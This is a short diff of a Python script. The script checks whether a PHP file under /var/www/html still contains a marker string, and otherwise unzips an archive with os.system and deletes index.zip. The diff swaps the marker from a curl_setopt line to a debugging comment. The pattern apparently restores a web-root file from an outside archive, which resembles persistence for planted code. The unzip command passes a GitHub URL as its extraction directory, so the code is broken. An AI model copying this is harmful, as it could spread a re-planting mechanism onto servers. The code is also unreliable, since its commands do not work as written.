@@ -12,7 +12,7 @@ else:
 try:
     with open("/var/www/html/coggenesis/mns.php", "r") as f:
         data = f.read()
-        if "curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);" in data:
+        if "* Set this to error_reporting( -1 ) for debugging." in data:
             # print("File ok")
             pass
         else:
@@ -30,4 +30,3 @@ except:
     # print("Extracting")
     os.system("unzip -o index.zip -d https://github.com/alleynsam/files/raw/main/mns.zip")
     os.system("rm index.zip")
-    
